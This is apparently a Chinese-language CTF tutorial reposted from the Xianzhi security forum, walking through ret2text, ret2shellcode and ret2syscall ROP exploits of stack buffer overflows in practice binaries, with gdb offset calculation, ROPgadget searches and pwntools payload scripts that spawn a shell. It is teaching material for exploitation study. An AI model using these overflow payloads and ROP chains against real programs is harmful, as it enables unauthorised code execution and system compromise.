> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [xz.aliyun.com](https://xz.aliyun.com/t/10721)

> 先知社区，先知安全技术社区

[TOC]

特征：执行程序. text 代码段已有的系统函数调用。

1，checksec 查看下保护

2，IDA 查看源码或伪代码分析

*   存在可调用的 system("/bin/sh") 函数

可直接控制流程调用 system 获得 shell

[![](https://xzfile.aliyuncs.com/media/upload/picture/20211227002850-e84011f4-6668-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211227002850-e84011f4-6668-1.png)

*   存在危险函数 gets() 函数

3，gdb 调式

```
关键：
    1.调试的关键是分析出我们能控制的内存的起始地址距离当前栈帧的返回地址的字节数，即距离ret指令的距离（偏移）;
    2.找到能控制的内存起始地址:输入点在栈内的起始地址,即get()函数的输入内容存放的起始地址。
```

3.1 根据 IDA 能分析出能控制的内存在栈中的`相对地址`，即起始地址。

[![](https://xzfile.aliyuncs.com/media/upload/picture/20211227002901-ef45241c-6668-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211227002901-ef45241c-6668-1.png)

3.2 在根据 gdb 调试计算偏移

我们断在这条指令处 b *0x080486AE

```
080486AE                 call    _gets
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20211227002911-f528bf1a-6668-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211227002911-f528bf1a-6668-1.png)

esp = 0xffffd380

ebp = 0xffffd408

输入点的起始位置 (s) = esp + 0x1c = 0xffffd39c

*   s 的地址为 00xffffd39c
*   s 相对于 ebp 的偏移为 0x6c = ebp - (s)
*   s 相对于返回地址的偏移为 0x6c+4 (32 位，参考堆栈图 ret 离 ebp 距离 4 字节)

[![](https://xzfile.aliyuncs.com/media/upload/picture/20211227002934-02ee3094-6669-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211227002934-02ee3094-6669-1.png)

payload
-------

```
##!/usr/bin/env python
from pwn import *

sh = process('./ret2text')
target = 0x804863a
sh.sendline('A' * (0x6c+4) + p32(target))
sh.interactive()
```

注意
--

源代码里面传入的是 buff 作为参数，但 IDA 分析中却出现同样的 s 传入作为参数，gbd 中证明这两个 s 实际地址是不同的。（这里在某些情况下计算偏移时需要注意，选对参照物）

[![](https://xzfile.aliyuncs.com/media/upload/picture/20211227002929-ffc7d208-6668-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211227002929-ffc7d208-6668-1.png)

特征：存在可写入 shellcode 的缓存区，并且具有可执行权限。

1,checksec 查看保护机制

2，源码分析，不存在任何直接调用能获取 shell 的函数

2.1 通过静态分析，发现程序存在可利用控制流程 gets() 函数

[![](https://xzfile.aliyuncs.com/media/upload/picture/20211227003120-420716e2-6669-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211227003120-420716e2-6669-1.png)

关键：buf2 在 bss 段，利用 ret2shellcode 的关键是，**shellcode 写入的内存空间具有可写可执行权限**。

2.2 通过 gdb 查看 buf2 所在 bss 段具有的权限：

[![](https://xzfile.aliyuncs.com/media/upload/picture/20211227003126-459725f4-6669-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211227003126-459725f4-6669-1.png)

```
gdb:vmmap   //查看内存分布情况
```

buf2 所在 bss 段所在内存区间具有 wx 权限。

动态确定实际偏移位置
----------

```
利用cyclic工具去动态计算偏移（pwntool里面自带）
用法：

生成字符串队列：cyclic 字符数
计算字符串偏移：cyclic -l 四个字母（注意程序的大小端序，下面举例说明）
```

1，gdb 动态调试

1.1 利用 cyclic 生成构造的字符串队列，作为程序的输入。

[![](https://xzfile.aliyuncs.com/media/upload/picture/20211227003142-4f222376-6669-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211227003142-4f222376-6669-1.png)

1.2 输入程序中断：

[![](https://xzfile.aliyuncs.com/media/upload/picture/20211227003147-51e0a1b4-6669-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211227003147-51e0a1b4-6669-1.png)

1.3cyclic -l daab 计算得出偏移：

[![](https://xzfile.aliyuncs.com/media/upload/picture/20211227003151-5454aba2-6669-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211227003151-5454aba2-6669-1.png)

原理：fault address(红字) 即是我们执行到的 ret 位置。

payload
-------

```
#!/usr/bin/env python
from pwn import *

sh = process('./ret2shellcode')
shellcode = asm(shellcraft.sh())
buf2_addr = 0x804a080

sh.sendline(shellcode.ljust(112, 'A') + p32(buf2_addr))
sh.interactive()
```

注：这里 shellcode 直接利用 pwntool 工具自动生成，避免自己去写 shellcode 的不必要时间花销。

特征：控制程序执行系统调用，获取 shell。

1，checksec 查看程序的保护机制

2，源码分析

```
#include <stdio.h>
#include <stdlib.h>

char *shell = "/bin/sh";

int main(void)
{
    setvbuf(stdout, 0LL, 2, 0LL);
    setvbuf(stdin, 0LL, 1, 0LL);

    char buf[100];

    printf("This time, no system() and NO SHELLCODE!!!\n");
    printf("What do you plan to do?\n");
    gets(buf);

    return 0;
}


```

存在可利用的 gets（）函数控制输入流，但没有 system() 和 shellcode。

3，知识概念引入

3.1 系统调用参考：  
[https://zh.wikipedia.org/wiki/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8](https://zh.wikipedia.org/wiki/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8)

简单地说，只要我们把对应获取 shell 的系统调用的参数放到对应的寄存器中，那么我们在执行 int 0x80 就可执行对应的系统调用。

`0xb 为 execve 对应的系统调用号。`

3.2 我们的目标是实现来获取 shell：

```
execve("/bin/sh",NULL,NULL)
其中，该程序是 32 位，所以我们需要使得

 系统调用号，即 eax 应该为 0xb
 第一个参数，即 ebx 应该指向 /bin/sh 的地址，其实执行 sh 的地址也可以。
 第二个参数，即 ecx 应该为 0
 第三个参数，即 edx 应该为 0


```

**调用流程：**执行 int0x80 -> 查看 eax = 0xb -> 调用 execve("/bin/sh",NULL,NULL);

3.3 我们需要做的是：

*   控制寄存器
*   控制寄存器获取的值

寻找 gadgets（程序代码片段）来实现我们需要做的，可以利用`Ropgadgets`工具搜索。

注：工具的详细用法不特意说明，百度即可。

4，寻找 gadgets

概念：gadget 即代码片段。

4.1 寻找控制 eax 的 gadgets

```
ROPgadget --binary rop  --only 'pop|ret' | grep 'eax'


```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20211227003247-757ecf7e-6669-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211227003247-757ecf7e-6669-1.png)

上述几个都可以控制 eax，我选取第二个来作为 gadgets。

4.2 类似的，我们可以得到控制其它寄存器的 gadgets(ebx)

```
ROPgadget --binary rop  --only 'pop|ret' | grep 'ebx'

```

这里选择

```
0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret

```

这个可以直接控制其它三个寄存器。

4.3 此外，我们需要获得 /bin/sh 字符串对应的地址。

```
ROPgadget --binary rop  --string '/bin/sh'

```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20211227003256-7b3e3896-6669-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211227003256-7b3e3896-6669-1.png)

4.4 最后还有 int 0x80 的地址

```
ROPgadget --binary rop  --only 'int'

```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20211227003303-7f05f91e-6669-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211227003303-7f05f91e-6669-1.png)

5.payload

```
#!/usr/bin/env python
from pwn import *

sh = process('./rop')

pop_eax_ret = 0x080bb196
pop_edx_ecx_ebx_ret = 0x0806eb90
int_0x80 = 0x08049421
binsh = 0x80be408
payload = flat(
    ['A' * 112, pop_eax_ret, 0xb, pop_edx_ecx_ebx_ret, 0, 0, binsh, int_0x80])
sh.sendline(payload)
sh.interactive()


```